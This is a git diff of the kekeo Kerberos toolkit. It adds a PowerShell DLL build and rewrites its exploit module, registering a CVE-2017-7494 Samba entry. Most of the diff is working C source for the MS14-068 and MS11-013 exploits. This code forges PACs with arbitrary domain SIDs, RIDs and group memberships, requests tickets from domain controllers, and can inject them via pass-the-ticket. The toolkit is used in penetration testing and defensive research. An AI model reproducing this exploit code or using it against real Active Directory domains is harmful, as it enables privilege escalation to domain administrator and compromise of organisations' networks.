+	int argc = 0;
+	wchar_t ** argv;
+	
+	if(argv = CommandLineToArgvW(input, &argc))
+	{
+		outputBufferElements = 0xff;
+		outputBufferElementsPosition = 0;
+		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
+			wmain(argc, argv);
+		LocalFree(argv);
+	}
+	return outputBuffer;
+}
+#endif
\ No newline at end of file
diff --git a/kekeo/kekeo.vcxproj b/kekeo/kekeo.vcxproj
index 0ccd39d..c6a5d0f 100644
--- a/kekeo/kekeo.vcxproj
+++ b/kekeo/kekeo.vcxproj
@@ -9,6 +9,14 @@
       <Configuration>Release</Configuration>
       <Platform>x64</Platform>
     </ProjectConfiguration>
+    <ProjectConfiguration Include="Second_Release_PowerShell|Win32">
+      <Configuration>Second_Release_PowerShell</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Second_Release_PowerShell|x64">
+      <Configuration>Second_Release_PowerShell</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
   </ItemGroup>
   <PropertyGroup Label="Globals">
     <ProjectGuid>{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}</ProjectGuid>
@@ -21,7 +29,8 @@
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
   <PropertyGroup Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType Condition="'$(Configuration)' != 'Second_Release_PowerShell'">Application</ConfigurationType>
+    <ConfigurationType Condition="'$(Configuration)' == 'Second_Release_PowerShell'">DynamicLibrary</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>Unicode</CharacterSet>
@@ -29,6 +38,7 @@
     <PlatformToolset Condition="'$(VCTargetsPath11)' != ''">v110_xp</PlatformToolset>
     <PlatformToolset Condition="'$(VCTargetsPath12)' != ''">v120_xp</PlatformToolset>
     <PlatformToolset Condition="'$(VCTargetsPath14)' != ''">v140_xp</PlatformToolset>
+    <PlatformToolset Condition="'$(VCTargetsPath15)' != ''">v141_xp</PlatformToolset>
     <UseOfMfc>static</UseOfMfc>
   </PropertyGroup>
   <PropertyGroup Label="Configuration" Condition="Exists('$(VCTargetsPath)\Platforms\$(Platform)\PlatformToolsets\ddk2003') Or Exists('$(VCTargetsPath)\..\Platforms\$(Platform)\PlatformToolsets\ddk2003')">
@@ -42,6 +52,7 @@
     <LinkIncremental>false</LinkIncremental>
     <IncludePath>$(SolutionDir)inc;$(IncludePath)</IncludePath>
     <LibraryPath>$(SolutionDir)lib\$(Platform);$(LibraryPath)</LibraryPath>
+    <TargetName Condition="'$(Configuration)' == 'Second_Release_PowerShell'">powerkeo</TargetName>
   </PropertyGroup>
   <ItemDefinitionGroup>
     <ClCompile>
@@ -87,6 +98,7 @@
     <ClCompile Include="..\modules\asn1\kull_m_kerberos_asn1_net.c" />
     <ClCompile Include="..\modules\asn1\kull_m_kerberos_oss_asn1_internal_$(Platform).c" />
     <ClCompile Include="..\modules\kull_m_file.c" />
+    <ClCompile Include="..\modules\kull_m_net.c" />
     <ClCompile Include="..\modules\kull_m_output.c" />
     <ClCompile Include="..\modules\kull_m_sock.c" />
     <ClCompile Include="..\modules\kull_m_string.c" />
@@ -117,6 +129,7 @@
     <ClInclude Include="..\modules\asn1\kull_m_kerberos_oss_asn1_internal.h" />
     <ClInclude Include="..\modules\kull_m_crypto_system.h" />
     <ClInclude Include="..\modules\kull_m_file.h" />
+    <ClInclude Include="..\modules\kull_m_net.h" />
     <ClInclude Include="..\modules\kull_m_output.h" />
     <ClInclude Include="..\modules\kull_m_samlib.h" />
     <ClInclude Include="..\modules\kull_m_sock.h" />
@@ -141,10 +154,10 @@
     <ClInclude Include="modules\kuhl_m_tgt.h" />
     <ClInclude Include="modules\kuhl_m_standard.h" />
   </ItemGroup>
-  <ItemGroup>
+  <ItemGroup Condition="'$(Configuration)' != 'Second_Release_PowerShell'">
     <ResourceCompile Include="kekeo.rc" />
   </ItemGroup>
-  <ItemGroup>
+  <ItemGroup Condition="'$(Configuration)' != 'Second_Release_PowerShell'">
     <None Include="..\modules\asn1\kekeo.a1sproj" />
     <None Include="..\modules\asn1\KerberosV5-PK-INIT-SPEC.asn" />
     <None Include="..\modules\asn1\KerberosV5Spec2.asn" />
diff --git a/kekeo/kekeo.vcxproj.filters b/kekeo/kekeo.vcxproj.filters
index 21cee31..b4f91e7 100644
--- a/kekeo/kekeo.vcxproj.filters
+++ b/kekeo/kekeo.vcxproj.filters
@@ -100,6 +100,9 @@
     <ClCompile Include="modules\kuhl_m_smb.c">
       <Filter>local modules</Filter>
     </ClCompile>
+    <ClCompile Include="..\modules\kull_m_net.c">
+      <Filter>common modules</Filter>
+    </ClCompile>
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="kekeo.h" />
@@ -190,29 +193,8 @@
     <ClInclude Include="modules\kuhl_m_smb.h">
       <Filter>local modules</Filter>
     </ClInclude>
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="kekeo.ico" />
-    <None Include="..\modules\asn1\kekeo.a1sproj">
-      <Filter>common modules\asn1</Filter>
-    </None>
-    <None Include="..\modules\asn1\KerberosV5-PK-INIT-SPEC.asn">
-      <Filter>common modules\asn1</Filter>
-    </None>
-    <None Include="..\modules\asn1\KerberosV5Spec2.asn">
-      <Filter>common modules\asn1</Filter>
-    </None>
-    <None Include="..\modules\asn1\MS-SFU-KILE.asn">
-      <Filter>common modules\asn1</Filter>
-    </None>
-    <None Include="..\modules\asn1\PKINIT.asn">
-      <Filter>common modules\asn1</Filter>
-    </None>
-    <None Include="..\modules\asn1\PKIX1Explicit88.asn">
-      <Filter>common modules\asn1</Filter>
-    </None>
-  </ItemGroup>
-  <ItemGroup>
-    <ResourceCompile Include="kekeo.rc" />
+    <ClInclude Include="..\modules\kull_m_net.h">
+      <Filter>common modules</Filter>
+    </ClInclude>
   </ItemGroup>
 </Project>
\ No newline at end of file
diff --git a/kekeo/modules/kuhl_m_exploit.c b/kekeo/modules/kuhl_m_exploit.c
index 93e8c1d..a7c6db4 100644
--- a/kekeo/modules/kuhl_m_exploit.c
+++ b/kekeo/modules/kuhl_m_exploit.c
@@ -1,347 +1,492 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : https://creativecommons.org/licenses/by/4.0/
-*/
-#include "kuhl_m_exploit.h"
-
-const KUHL_M_C kuhl_m_c_exploit[] = {
-	{kuhl_m_exploit_ms14068,	L"ms14068",	L"MS14-068"},
-	{kuhl_m_exploit_ms11013,	L"ms11013",	L"MS11-013"},
-};
-const KUHL_M kuhl_m_exploit = {
-	L"exploit",	L"Exploit module", NULL,
-	ARRAYSIZE(kuhl_m_c_exploit), kuhl_m_c_exploit, NULL, NULL
-};
-
-NTSTATUS kuhl_m_exploit_ms14068(int argc, wchar_t * argv[])
-{
-	PKULL_M_SOCK socket;
-	KULL_M_SOCK dstSocket;
-	OssBuf TgsReq2 = {0, NULL};
-	TGS_REP *TgsRep, *TgsRep2 = NULL;
-	EncTGSRepPart *encTgsRepPart, *encTgsRepPart2 = NULL;
-	PKIWI_AUTH_INFOS infos;
-	RPC_AUTH_IDENTITY_HANDLE hAuth;
-	HANDLE hDS;
-	DWORD i, nbDcInfos = 0;
-	PDS_DOMAIN_CONTROLLER_INFO_1 dcInfos = NULL;
-	PWSTR postname;
-	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;
-	BOOL isSuccess = FALSE;
-
-	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
-		callback = kuhl_m_kerberos_ptt_data;
-
-	if(kuhl_m_exploit_generic_ms(argc, argv, &TgsRep, &encTgsRepPart, NULL, &infos, &socket))
-	{
-		if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq2, &TgsRep->cname, TgsRep->crealm, &encTgsRepPart->sname, 0, &TgsRep->ticket, &encTgsRepPart->key, NULL, NULL, NULL))
-		{
-			if(kull_m_string_args_byName(argc, argv, L"kdc", NULL, NULL) || !infos->w_password)
-			{
-				if(!kull_m_string_args_byName(argc, argv, L"kdc", NULL, NULL))
-					kprintf(L"[DCSs] No KDC specified, neither user password: using default KDC\n");
-				if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq2, (LPVOID *) &TgsRep2, TGS_REP_PDU))
-				{
-					if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep2, &encTgsRepPart->key, EncTGSRepPart_PDU, &encTgsRepPart2))
-					{
-						if(postname = kuhl_m_exploit_ms14068_getname(L"(ms14068)", socket->servername))
-						{
-							kull_m_kerberos_asn1_KdcRep_save(TgsRep2, encTgsRepPart2, NULL, postname, callback);
-							LocalFree(postname);
-						}
-						ossFreePDU(&kull_m_kerberos_asn1_world, EncTGSRepPart_PDU, encTgsRepPart2);
-					}
-					ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep2);
-				}
-				ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq2.value);
-			}
-			else
-			{
-				i = DsMakePasswordCredentials(infos->w_short_cname, infos->w_realm, infos->w_password, &hAuth);
-				if(i == ERROR_SUCCESS)
-				{
-					i = DsBindWithCred(socket->servername, infos->w_realm, hAuth, &hDS);
-					if(i == ERROR_SUCCESS)
-					{
-						i = DsGetDomainControllerInfo(hDS, infos->w_realm, 1, &nbDcInfos, (PVOID *) &dcInfos);
-						if(i == ERROR_SUCCESS)
-						{
-							kprintf(L"[DCs] Number : %u\n", nbDcInfos);
-							for(i = 0; i < nbDcInfos; i++)
-							{
-								kprintf(L" %u | %s (%s)\n", i, dcInfos[i].DnsHostName, dcInfos[i].NetbiosName);
-								if(dcInfos[i].fDsEnabled)
-								{
-									if(kull_m_sock_init_addr_protocol(dcInfos[i].DnsHostName, NULL, htons(socket->address.sin_port), socket->protocol, &dstSocket))
-									{
-										if(kull_m_sock_connect(&dstSocket))
-										{
-											if(kull_m_kerberos_asn1_net_callKdcOssBuf(&dstSocket, &TgsReq2, (LPVOID *) &TgsRep2, TGS_REP_PDU))
-											{
-												if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep2, &encTgsRepPart->key, EncTGSRepPart_PDU, &encTgsRepPart2))
-												{
-													if(postname = kuhl_m_exploit_ms14068_getname(L"(ms14068)", dcInfos[i].NetbiosName))
-													{
-														isSuccess = kull_m_kerberos_asn1_KdcRep_save(TgsRep2, encTgsRepPart2, NULL, postname, callback);
-														LocalFree(postname);
-													}
-													ossFreePDU(&kull_m_kerberos_asn1_world, EncTGSRepPart_PDU, encTgsRepPart2);
-												}
-												ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep2);
-											}
-										}
-										kull_m_sock_termSocket(&dstSocket);
-									}
-								}
-								else kprintf(L"  > DC is not enabled!\n");
-
-								if(callback && isSuccess)
-								{
-									kprintf(L"Break on first injection when Pass-the-Ticket\n");
-									break;
-								}
-							}
-							DsFreeDomainControllerInfo(1, nbDcInfos, dcInfos);
-						}
-						else PRINT_ERROR(L"DsGetDomainControllerInfo: %08x\n", i);
-						DsUnBind(&hDS);
-					}
-					else PRINT_ERROR(L"DsBindWithCred: %08x\n", i);
-					DsFreePasswordCredentials(hAuth);
-				}
-				else PRINT_ERROR(L"DsMakePasswordCredentials: %08x\n", i);
-			}
-		}
-		ossFreePDU(&kull_m_kerberos_asn1_world, EncTGSRepPart_PDU, encTgsRepPart);
-		ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep);
-		kull_m_kerberos_asn1_Authinfos_delete(infos);
-		kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
-	}
-	return STATUS_SUCCESS;
-}
-
-NTSTATUS kuhl_m_exploit_ms11013(int argc, wchar_t * argv[])
-{
-	PCWSTR szData;
-	if(kull_m_string_args_byName(argc, argv, L"service", &szData, NULL))
-		kuhl_m_exploit_generic_ms(argc, argv, NULL, NULL, szData, NULL, NULL);
-	else PRINT_ERROR(L"A service name is needed ( /service:cifs/target.domain.local[,http/webserver.domain.local] )\n");
-	return STATUS_SUCCESS;
-}
-
-PWSTR kuhl_m_exploit_ms14068_getname(PCWSTR pre, PCWSTR post)
-{
-	PWSTR result = NULL;
-	DWORD prelen = lstrlen(pre), postlen = lstrlen(post), len = 1 + prelen + 1 + postlen + 1;
-	if(result = (PWSTR) LocalAlloc(LPTR, len * sizeof(wchar_t)))
-	{
-		wcscat_s(result, len, L"_");
-		wcscat_s(result, len, pre);
-		wcscat_s(result, len, L"_");
-		wcscat_s(result, len, post);
-	}
-	return result;
-}
-
-BOOL kuhl_m_exploit_generic_ms(int argc, wchar_t * argv[], TGS_REP **TgsRep, EncTGSRepPart **encTgsRepPart, PCWSTR szService, PKIWI_AUTH_INFOS *reuseinfos, PKULL_M_SOCK *reusesocket)
-{
-	BOOL status = FALSE;
-	PKIWI_AUTH_INFOS infos;
-	PKULL_M_SOCK socket;
-	AS_REP *AsRep = NULL;
-	EncASRepPart *encAsRepPart = NULL;
-	_octet1 pac = {0, NULL};
-	OssBuf TgsReq = {0, NULL};
-	PWSTR dupService, nextSetToken, SetToken;
-	PrincipalName pService;
-	TGS_REP *TgsRepService = NULL;
-	EncTGSRepPart *encTgsRepPartService = NULL;
-	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;
-
-	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
-		callback = kuhl_m_kerberos_ptt_data;
-	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
-	{
-		infos->needPac = FALSE;
-		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
-		{
-			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &AsRep, &encAsRepPart, NULL))
-			{
-				if(kuhl_m_exploit_give_pac(argc, argv, &encAsRepPart->authtime, infos, socket, &pac))
-				{
-					if(TgsRep && encTgsRepPart)
-					{
-						*TgsRep = NULL;
-						*encTgsRepPart = NULL;
-						if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &AsRep->cname, AsRep->crealm, &encAsRepPart->sname, 0, &AsRep->ticket, &encAsRepPart->key, NULL, &pac, NULL))
-						{
-							if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) TgsRep, TGS_REP_PDU))
-							{
-								if(!(status = kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(*TgsRep, &encAsRepPart->key, EncTGSRepPart_PDU, encTgsRepPart)))
-									ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, *TgsRep);
-							}
-							ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
-						}
-					}
-					else if(szService)
-					{
-						if(dupService = _wcsdup(szService))
-						{
-							for(nextSetToken = NULL, SetToken = wcstok_s(dupService, L",", &nextSetToken); SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
-							{
-								kull_m_kerberos_asn1_PrincipalName_create_fromName(&pService, SetToken);
-								kprintf(L"  ");
-								kull_m_kerberos_asn1_PrincipalName_descr(&pService, FALSE);
-								kprintf(L"\n");
-								if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &AsRep->cname, AsRep->crealm, &pService, 0, &AsRep->ticket, &encAsRepPart->key, NULL, NULL, NULL))
-								{
-									if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRepService, TGS_REP_PDU))
-									{
-										if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRepService, &encAsRepPart->key, EncTGSRepPart_PDU, &encTgsRepPartService))
-										{
-											kull_m_kerberos_asn1_KdcRep_save(TgsRepService, encTgsRepPartService, NULL, L"_(ms11013)", callback);
-											ossFreePDU(&kull_m_kerberos_asn1_world, EncTGSRepPart_PDU, encTgsRepPartService);
-										}
-										ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRepService);
-									}
-									ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
-								}
-								kull_m_kerberos_asn1_PrincipalName_delete(&pService);
-							}
-							free(dupService);
-						}
-					}
-				}
-				else PRINT_ERROR(L"Unable to build a PAC\n");
-				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, encAsRepPart);
-				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, AsRep);
-			}
-			if(reusesocket)
-				*reusesocket = socket;
-			else kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
-		}
-		if(reuseinfos)
-			*reuseinfos = infos;
-		else kull_m_kerberos_asn1_Authinfos_delete(infos);
-	}
-	return status;
-}
-
-BOOL kuhl_m_exploit_give_pac(int argc, wchar_t * argv[], KerberosTime *authtime, PKIWI_AUTH_INFOS infos, PKULL_M_SOCK socket, _octet1 *pac)
-{
-	PCWSTR szData;
-	PISID sid = NULL;
-	DWORD rid = 0, cbGroups = 0, cbSids = 0, i;
-	PGROUP_MEMBERSHIP groups = NULL;
-	PKERB_SID_AND_ATTRIBUTES sids = NULL;
-	PCLAIMS_SET claims = NULL;
-	PKERB_VALIDATION_INFO validationInfo;
-	FILETIME ftAuthTime;
-
-	AS_REP *asrep = NULL;
-	EncKDCRepPart *enckdcreppart = NULL;
-	OssBuf TgsReq = {0, NULL};
-	TGS_REP *TgsRep = NULL;
-	_octet1 tmpPac;
-	BOOL oldNeedPac;
-
-	pac->length = 0;
-	pac->value = NULL;
-	if(kull_m_string_args_byName(argc, argv, L"sid", &szData, NULL))
-		if(!ConvertStringSidToSid(szData, (PSID *) &sid))
-			PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
-	if(kull_m_string_args_byName(argc, argv, L"id", &szData, NULL) || kull_m_string_args_byName(argc, argv, L"rid", &szData, NULL))
-		rid = wcstoul(szData, NULL, 0);
-	kull_m_string_args_byName(argc, argv, L"groups", &szData, NULL);
-	kuhl_m_pac_stringToGroups(szData, &groups, &cbGroups);
-	if(kull_m_string_args_byName(argc, argv, L"sids", &szData, NULL))
-		kuhl_m_pac_stringToSids(szData, &sids, &cbSids);
-	if(kull_m_string_args_byName(argc, argv, L"claims", &szData, NULL))
-		claims = kuhl_m_kerberos_claims_createFromString(szData);
-
-	if(!(sid && rid))
-	{
-		oldNeedPac = infos->needPac;
-		infos->needPac = TRUE;
-		if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &asrep, &enckdcreppart, NULL))
-		{
-			if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &asrep->cname, asrep->crealm, &asrep->cname, KERB_KDCOPTION_standard | KERB_KDCOPTION_enc_tkt_in_skey, &asrep->ticket, &enckdcreppart->key, &asrep->ticket, NULL, NULL))
-			{
-				if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
-				{
-					if(kull_m_kerberos_asn1_PAC_from_EncTicketPart(&enckdcreppart->key, &TgsRep->ticket.enc_part, &tmpPac))
-					{
-						if(!kuhl_m_kerberos_pac_to_infos((PPACTYPE) tmpPac.value, tmpPac.length, &sid, &rid))
-							PRINT_ERROR(L"Unable to get SID and/or RID from a PAC\n");
-						if(tmpPac.value)
-							LocalFree(tmpPac.value);
-					}
-					else PRINT_ERROR(L"No PAC found\n");
-					ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep);
-				}
-				ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
-			}
-			ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, enckdcreppart);
-			ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, asrep);
-		}
-		infos->needPac = oldNeedPac;
-	}
-
-	if(sid && rid && groups && cbGroups)
-	{
-		kull_m_kerberos_asn1_KerberosTime_to_filetime(authtime, &ftAuthTime);
-		kprintf(L"AuthTime     : ");
-		kull_m_string_displayLocalFileTime(&ftAuthTime);
-		kprintf(L"\nDomain SID   : ");
-		kull_m_string_displaySID(sid);
-		kprintf(L"\nUser RID     : %u\nGroups       : *", rid);
-		for(i = 0; i < cbGroups; i++)
-			kprintf(L"%u ", groups[i].RelativeId);
-		kprintf(L"\n");
-		if(sids && cbSids)
-		{
-			kprintf(L"Extra SIDs   :\n");
-			for(i = 0; i < cbSids; i++)
-			{
-				kprintf(L"  ");
-				kull_m_string_displaySID(sids[i].Sid);
-				kprintf(L"\n");
-			}
-		}
-		if(claims)
-		{
-			kprintf(L"Claims       :\n");
-			kuhl_m_kerberos_claims_displayClaimsSet(claims);
-			kprintf(L"\n");
-		}
-		
-		if(validationInfo = kuhl_m_pac_infoToValidationInfo(&ftAuthTime, infos->w_short_cname, infos->w_realm, infos->w_short_realm, sid, rid, groups, cbGroups, sids, cbSids))
-		{
-			if(kuhl_m_pac_validationInfo_to_PAC(validationInfo, &ftAuthTime, infos->w_cname, KERB_CHECKSUM_MD5, claims, (PPACTYPE *) &pac->value, (DWORD *) &pac->length))
-			{
-				if(!NT_SUCCESS(kuhl_m_pac_signature((PPACTYPE) pac->value, pac->length, KERB_CHECKSUM_MD5, NULL, 0)))
-				{
-					LocalFree(pac->value);
-					pac->length = 0;
-					pac->value = NULL;
-				}
-			}
-			LocalFree(validationInfo);
-		}
-	}
-
-	if(sid)
-		LocalFree(sid);
-	if(groups && cbGroups)
-		LocalFree(groups);
-	if(sids && cbSids)
-	{
-		for(i = 0; i < cbSids; i++)
-			LocalFree(sids[i].Sid);
-		LocalFree(sids);
-	}
-	if(claims)
-		kuhl_m_kerberos_claims_free(claims);
-	return (pac->value != NULL);
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#include "kuhl_m_exploit.h"
+
+const KUHL_M_C kuhl_m_c_exploit[] = {
+	{kuhl_m_exploit_ms14068,		L"ms14068",	L"MS14-068"},
+	{kuhl_m_exploit_ms11013,		L"ms11013",	L"MS11-013"},
+	{kuhl_m_exploit_cve20177494,	L"cve20177494", L"CVE-2017-7494 (Samba)"},
+};
+const KUHL_M kuhl_m_exploit = {
+	L"exploit",	L"Exploit module", NULL,
+	ARRAYSIZE(kuhl_m_c_exploit), kuhl_m_c_exploit, NULL, NULL
+};
+
+NTSTATUS kuhl_m_exploit_ms14068(int argc, wchar_t * argv[])
+{
+	PKULL_M_SOCK socket;
+	KULL_M_SOCK dstSocket;
+	OssBuf TgsReq2 = {0, NULL};
+	TGS_REP *TgsRep, *TgsRep2 = NULL;
+	EncTGSRepPart *encTgsRepPart, *encTgsRepPart2 = NULL;
+	PKIWI_AUTH_INFOS infos;
+	RPC_AUTH_IDENTITY_HANDLE hAuth;
+	HANDLE hDS;
+	DWORD i, nbDcInfos = 0;
+	PDS_DOMAIN_CONTROLLER_INFO_1 dcInfos = NULL;
+	PWSTR postname;
+	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;
+	BOOL isSuccess = FALSE;
+
+	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
+		callback = kuhl_m_kerberos_ptt_data;
+
+	if(kuhl_m_exploit_generic_ms(argc, argv, &TgsRep, &encTgsRepPart, NULL, &infos, &socket))
+	{
+		if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq2, &TgsRep->cname, TgsRep->crealm, &encTgsRepPart->sname, 0, &TgsRep->ticket, &encTgsRepPart->key, NULL, NULL, NULL))
+		{
+			if(kull_m_string_args_byName(argc, argv, L"kdc", NULL, NULL) || !infos->w_password)
+			{
+				if(!kull_m_string_args_byName(argc, argv, L"kdc", NULL, NULL))
+					kprintf(L"[DCSs] No KDC specified, neither user password: using default KDC\n");
+				if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq2, (LPVOID *) &TgsRep2, TGS_REP_PDU))
+				{
+					if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep2, &encTgsRepPart->key, EncTGSRepPart_PDU, &encTgsRepPart2))
+					{
+						if(postname = kuhl_m_exploit_ms14068_getname(L"(ms14068)", socket->servername))
+						{
+							kull_m_kerberos_asn1_KdcRep_save(TgsRep2, encTgsRepPart2, NULL, postname, callback);
+							LocalFree(postname);
+						}
+						ossFreePDU(&kull_m_kerberos_asn1_world, EncTGSRepPart_PDU, encTgsRepPart2);
+					}
+					ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep2);
+				}
+				ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq2.value);
+			}
+			else
+			{
+				i = DsMakePasswordCredentials(infos->w_short_cname, infos->w_realm, infos->w_password, &hAuth);
+				if(i == ERROR_SUCCESS)
+				{
+					i = DsBindWithCred(socket->servername, infos->w_realm, hAuth, &hDS);
+					if(i == ERROR_SUCCESS)
+					{
+						i = DsGetDomainControllerInfo(hDS, infos->w_realm, 1, &nbDcInfos, (PVOID *) &dcInfos);
+						if(i == ERROR_SUCCESS)
+						{
+							kprintf(L"[DCs] Number : %u\n", nbDcInfos);
+							for(i = 0; i < nbDcInfos; i++)
+							{
+								kprintf(L" %u | %s (%s)\n", i, dcInfos[i].DnsHostName, dcInfos[i].NetbiosName);
+								if(dcInfos[i].fDsEnabled)
+								{
+									if(kull_m_sock_init_addr_protocol(dcInfos[i].DnsHostName, NULL, htons(socket->address.sin_port), socket->protocol, &dstSocket))
+									{
+										if(kull_m_sock_connect(&dstSocket))
+										{
+											if(kull_m_kerberos_asn1_net_callKdcOssBuf(&dstSocket, &TgsReq2, (LPVOID *) &TgsRep2, TGS_REP_PDU))
+											{
+												if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep2, &encTgsRepPart->key, EncTGSRepPart_PDU, &encTgsRepPart2))
+												{
+													if(postname = kuhl_m_exploit_ms14068_getname(L"(ms14068)", dcInfos[i].NetbiosName))
+													{
+														isSuccess = kull_m_kerberos_asn1_KdcRep_save(TgsRep2, encTgsRepPart2, NULL, postname, callback);
+														LocalFree(postname);
+													}
+													ossFreePDU(&kull_m_kerberos_asn1_world, EncTGSRepPart_PDU, encTgsRepPart2);
+												}
+												ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep2);
+											}
+										}
+										kull_m_sock_termSocket(&dstSocket);
+									}
+								}
+								else kprintf(L"  > DC is not enabled!\n");
+
+								if(callback && isSuccess)
+								{
+									kprintf(L"Break on first injection when Pass-the-Ticket\n");
+									break;
+								}
+							}
+							DsFreeDomainControllerInfo(1, nbDcInfos, dcInfos);
+						}
+						else PRINT_ERROR(L"DsGetDomainControllerInfo: %08x\n", i);
+						DsUnBind(&hDS);
+					}
+					else PRINT_ERROR(L"DsBindWithCred: %08x\n", i);
+					DsFreePasswordCredentials(hAuth);
+				}
+				else PRINT_ERROR(L"DsMakePasswordCredentials: %08x\n", i);
+			}
+		}
+		ossFreePDU(&kull_m_kerberos_asn1_world, EncTGSRepPart_PDU, encTgsRepPart);
+		ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep);
+		kull_m_kerberos_asn1_Authinfos_delete(infos);
+		kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
+	}
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_exploit_ms11013(int argc, wchar_t * argv[])
+{
+	PCWSTR szData;
+	if(kull_m_string_args_byName(argc, argv, L"service", &szData, NULL))
+		kuhl_m_exploit_generic_ms(argc, argv, NULL, NULL, szData, NULL, NULL);
+	else PRINT_ERROR(L"A service name is needed ( /service:cifs/target.domain.local[,http/webserver.domain.local] )\n");
+	return STATUS_SUCCESS;
+}
+
+PWSTR kuhl_m_exploit_ms14068_getname(PCWSTR pre, PCWSTR post)
+{
+	PWSTR result = NULL;
+	DWORD prelen = lstrlen(pre), postlen = lstrlen(post), len = 1 + prelen + 1 + postlen + 1;
+	if(result = (PWSTR) LocalAlloc(LPTR, len * sizeof(wchar_t)))
+	{
+		wcscat_s(result, len, L"_");
+		wcscat_s(result, len, pre);
+		wcscat_s(result, len, L"_");
+		wcscat_s(result, len, post);
+	}
+	return result;
+}
+
+BOOL kuhl_m_exploit_generic_ms(int argc, wchar_t * argv[], TGS_REP **TgsRep, EncTGSRepPart **encTgsRepPart, PCWSTR szService, PKIWI_AUTH_INFOS *reuseinfos, PKULL_M_SOCK *reusesocket)
+{
+	BOOL status = FALSE;
+	PKIWI_AUTH_INFOS infos;
+	PKULL_M_SOCK socket;
+	AS_REP *AsRep = NULL;
+	EncASRepPart *encAsRepPart = NULL;
+	_octet1 pac = {0, NULL};
+	OssBuf TgsReq = {0, NULL};
+	PWSTR dupService, nextSetToken, SetToken;
+	PrincipalName pService;
+	TGS_REP *TgsRepService = NULL;
+	EncTGSRepPart *encTgsRepPartService = NULL;
+	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;
+
+	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
+		callback = kuhl_m_kerberos_ptt_data;
+	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
+	{
+		infos->needPac = FALSE;
+		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
+		{
+			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &AsRep, &encAsRepPart, NULL))
+			{
